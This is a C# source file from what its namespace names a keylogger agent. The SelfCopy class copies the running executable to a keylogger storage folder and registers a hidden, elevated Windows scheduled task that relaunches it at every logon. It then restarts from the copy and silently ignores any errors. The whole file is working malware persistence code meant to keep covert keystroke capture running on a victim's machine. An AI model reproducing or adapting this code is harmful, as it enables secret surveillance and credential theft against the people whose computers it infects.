using System.Diagnostics;

namespace Local_Keylogger_Agent
{
    internal class SelfCopy
    {
        private string taskName;
        public void CopySelfToStartup()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                string appDirectory = Path.GetDirectoryName(exePath);
                string fileName = Path.GetFileName(exePath);
                string destinationPath = Path.Combine(Storage.KeyLogerCopyPath, fileName);

                if(!File.Exists(destinationPath))
                {
                    File.Copy(exePath, destinationPath, true); // Copy the executable to the target directory
                }

                taskName = Path.GetFileNameWithoutExtension(fileName);

                RegisterScheduledTask(destinationPath);
            }
            catch (Exception ex)
            {
                //Ignore any exceptions that occur during the copy or task registration
            }
        }
        private void RegisterScheduledTask(string exeFilePath)
        {
            string args = $"/Create /TN \"{taskName}\" " +
                          $"/TR \"\\\"{exeFilePath}\\\"\" " +
                          "/SC ONLOGON /RL HIGHEST /F";

            var psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = args,
                UseShellExecute = true,
                Verb = "runas", // Run as administrator
                WindowStyle = ProcessWindowStyle.Hidden,
            };

            Process process = Process.Start(psi);
            process?.WaitForExit();

            Process.Start(exeFilePath);
            Application.Exit();
        }
    }
}
